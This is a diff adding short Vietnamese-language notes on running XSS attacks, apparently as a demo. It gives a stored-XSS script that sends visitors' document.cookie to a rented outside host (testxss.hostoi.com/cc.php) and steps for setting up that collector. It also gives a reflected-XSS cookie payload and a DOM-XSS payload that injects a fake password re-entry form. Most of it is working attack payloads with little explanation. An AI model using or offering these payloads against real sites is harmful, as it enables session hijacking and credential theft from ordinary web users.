@@ -1,0 +1,23 @@
+//cac buoc thuc hien demo store XSS
+dau tien :
+ta phai kiem mot hosting free tren mang 
+up file cc.php trong cung thu muc len,sau do la up file logs.txt len cung thu muc chua file cc.php (cap full quyen)
+
+do host thue : testxss.hostoi.com
+nen chung ta se dung link nhu sau:
+<script>location.href='http://www.testxss.hostoi.com/cc.php?cookie='+document.cookie;</script>
+
+khi do thi cu moi khi vao trang store xss thi no se phai load lai doan script se gui file cookie cua nguoi dung toi trang web cua ke tan cong
+
+
+//cac buoc thuc hien khai thac lo hong XSS reflect : thay vi nhap ten chung ta nhap doan code sau :
+<script>alert (document.cookie);</script>
+chung ta se an trom duoc cookie hien tai cua nguoi dung
+
+//ve test bao mat dom xss (thay doi giao dien web )ta co vi du sau :
+<script>
+document.getElementById('hello').innerHTML="<form method='get'>pls reenter password : <input type='password' name='hacked' /><input type='submit' value='submit' name='submit' onclick='show()' /></form>";
+var a="<?php echo $_GET['hacked']; ?>";
+function show(){alert(a);}</script>
+
+</script>
